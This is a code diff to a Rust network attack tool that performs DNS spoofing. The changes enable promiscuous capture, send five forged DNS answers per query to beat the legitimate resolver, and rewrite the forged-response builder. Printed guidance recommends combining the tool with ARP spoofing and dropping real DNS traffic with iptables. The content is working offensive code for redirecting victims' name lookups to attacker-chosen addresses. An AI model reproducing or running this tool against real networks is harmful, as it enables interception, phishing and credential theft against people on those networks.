@@ -429,6 +429,15 @@ fn start_dns_spoof(config: &DnsConfig) {
     for mapping in &config.mappings {
         println!(" - {} -> {}", mapping.domain, mapping.target_ip);
     }
+    println!("\n=== Important Notes ===");
+    println!("1. DNS spoofing works by racing legitimate DNS servers");
+    println!("2. For best results, also run ARP spoofing to intercept traffic");
+    println!("3. Consider blocking real DNS traffic with:");
+    println!("   sudo iptables -A FORWARD -p udp --dport 53 -j DROP");
+    println!("   sudo iptables -A FORWARD -p tcp --dport 53 -j DROP");
+    println!("4. To remove rules later:");
+    println!("   sudo iptables -D FORWARD -p udp --dport 53 -j DROP");
+    println!("   sudo iptables -D FORWARD -p tcp --dport 53 -j DROP");
     println!("\nPress Ctrl+C to stop.\n");
 
     // Check for root privileges
@@ -436,6 +445,18 @@ fn start_dns_spoof(config: &DnsConfig) {
         println!("Error: Root privileges required for DNS spoofing.");
         println!("Please run with sudo.");
         return;
+    }
+
+    // Enable promiscuous mode on interface
+    println!("Enabling promiscuous mode on {}...", interface.name);
+    let status = std::process::Command::new("ip")
+        .args(&["link", "set", &interface.name, "promisc", "on"])
+        .status();
+    
+    if status.is_err() || !status.unwrap().success() {
+        println!("Warning: Failed to enable promiscuous mode. May not capture all traffic.");
+    } else {
+        println!("Promiscuous mode enabled successfully.");
     }
 
     // Create mapping lookup
@@ -461,6 +482,7 @@ fn start_dns_spoof(config: &DnsConfig) {
 
 fn spoof_dns(interface_name: &str, target: Option<Ipv4Addr>, mappings: Arc<Mutex<HashMap<String, Ipv4Addr>>>) {
     use pnet::datalink::Channel::Ethernet;
+    use pnet::datalink::Config;
     
     let interfaces = datalink::interfaces();
     let interface = interfaces
@@ -468,25 +490,44 @@ fn spoof_dns(interface_name: &str, target: Option<Ipv4Addr>, mappings: Arc<Mutex
         .find(|iface| iface.name == interface_name)
         .expect("Failed to find interface");
 
-    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
+    // Configure channel with promiscuous mode
+    let mut config = Config::default();
+    config.promiscuous = true;
+    
+    let (mut tx, mut rx) = match datalink::channel(&interface, config) {
         Ok(Ethernet(tx, rx)) => (tx, rx),
         Ok(_) => panic!("Unsupported channel type"),
         Err(e) => panic!("Failed to create datalink channel: {}", e),
     };
 
     println!("DNS spoofing started. Listening for DNS queries...");
+    println!("Note: For best results, also use ARP spoofing to intercept traffic.");
+    println!("DNS spoofing works by racing the legitimate DNS server.\n");
+
+    let mut packet_count = 0;
+    let mut dns_query_count = 0;
 
     loop {
         match rx.next() {
             Ok(packet) => {
+                packet_count += 1;
+                
                 if let Some(ethernet) = EthernetPacket::new(packet) {
                     if ethernet.get_ethertype() == EtherTypes::Ipv4 {
                         if let Some(ipv4) = Ipv4Packet::new(ethernet.payload()) {
                             // Check if it's UDP
                             if ipv4.get_next_level_protocol() == IpNextHeaderProtocols::Udp {
                                 if let Some(udp) = UdpPacket::new(ipv4.payload()) {
-                                    // Check if it's DNS (port 53)
+                                    // Check if it's DNS query (destination port 53)
                                     if udp.get_destination() == 53 {
+                                        dns_query_count += 1;
+                                        
+                                        // Debug: Show we're seeing DNS traffic
+                                        if dns_query_count % 10 == 1 {
+                                            println!("Stats: {} packets captured, {} DNS queries seen", 
+                                                packet_count, dns_query_count);
+                                        }
+                                        
                                         // Check if we should spoof this target
                                         if let Some(target_ip) = target {
                                             if ipv4.get_source() != target_ip {
@@ -511,18 +552,21 @@ fn spoof_dns(interface_name: &str, target: Option<Ipv4Addr>, mappings: Arc<Mutex
                                             drop(mappings_lock);
                                             
                                             if let Some(spoof_ip) = response_ip {
-                                                println!("Spoofing DNS query: {} -> {} (from {})", 
+                                                println!(">>> Spoofing DNS query: {} -> {} (from {})", 
                                                     domain, spoof_ip, ipv4.get_source());
                                                 
-                                                // Send spoofed DNS response
-                                                send_dns_response(
-                                                    &mut tx,
-                                                    &ethernet,
-                                                    &ipv4,
-                                                    &udp,
-                                                    &domain,
-                                                    spoof_ip
-                                                );
+                                                // Send multiple spoofed responses to win the race
+                                                // This increases the chance our response arrives first
+                                                for _ in 0..5 {
+                                                    send_dns_response(
+                                                        &mut tx,
+                                                        &ethernet,
+                                                        &ipv4,
+                                                        &udp,
+                                                        &domain,
+                                                        spoof_ip
+                                                    );
+                                                }
                                             }
                                         }
                                     }
@@ -639,46 +683,55 @@ fn send_dns_response(
 fn build_dns_response(query: &[u8], spoof_ip: Ipv4Addr) -> Vec<u8> {
     let mut response = Vec::new();
     
-    // Copy query (at least the header and question)
-    if query.len() >= 12 {
-        response.extend_from_slice(query);
-        
-        // Modify DNS header flags for response
-        // Set QR bit (response), AA bit (authoritative), and clear error code
-        response[2] = 0x81; // QR=1, Opcode=0, AA=1, TC=0, RD=0
-        response[3] = 0x80; // RA=1, Z=0, RCODE=0
-        
-        // Set answer count to 1
-        response[6] = 0x00;
-        response[7] = 0x01;
-        
-        // Add answer section
-        // Name pointer to question (compression)
-        response.push(0xc0);
-        response.push(0x0c);
-        
-        // Type A (0x0001)
-        response.push(0x00);
-        response.push(0x01);
-        
-        // Class IN (0x0001)
-        response.push(0x00);
-        response.push(0x01);
-        
-        // TTL (300 seconds)
-        response.push(0x00);
-        response.push(0x00);
-        response.push(0x01);
-        response.push(0x2c);
-        
-        // Data length (4 bytes for IPv4)
-        response.push(0x00);
-        response.push(0x04);
-        
-        // IP address
-        let octets = spoof_ip.octets();
-        response.extend_from_slice(&octets);
+    // Copy entire query first
+    if query.len() < 12 {
+        return response;
     }
+    
+    response.extend_from_slice(query);
+    
+    // Preserve Transaction ID (bytes 0-1) - already copied
+    
+    // Modify DNS header flags for response
+    // Byte 2: QR=1 (response), Opcode=0, AA=1 (authoritative), TC=0, RD=1 (recursion desired, copy from query)
+    let rd_bit = query[2] & 0x01; // Preserve RD bit from query
+    response[2] = 0x84 | rd_bit; // QR=1, Opcode=0, AA=1, TC=0, RD=copy
+    
+    // Byte 3: RA=1 (recursion available), Z=0, RCODE=0 (no error)
+    response[3] = 0x80;
+    
+    // Set answer count to 1 (bytes 6-7)
+    response[6] = 0x00;
+    response[7] = 0x01;
+    
+    // Authority and Additional records count stay 0
+    
+    // Add answer section
+    // Name pointer to question (DNS compression - points to offset 12)
+    response.push(0xc0);
+    response.push(0x0c);
+    
+    // Type A (0x0001)
+    response.push(0x00);
+    response.push(0x01);
+    
+    // Class IN (0x0001)
+    response.push(0x00);
+    response.push(0x01);
+    
+    // TTL (60 seconds - short TTL for spoofed records)
+    response.push(0x00);
+    response.push(0x00);
+    response.push(0x00);
+    response.push(0x3c);
+    
+    // Data length (4 bytes for IPv4)
+    response.push(0x00);
+    response.push(0x04);
+    
+    // IP address
+    let octets = spoof_ip.octets();
+    response.extend_from_slice(&octets);
     
     response
 }
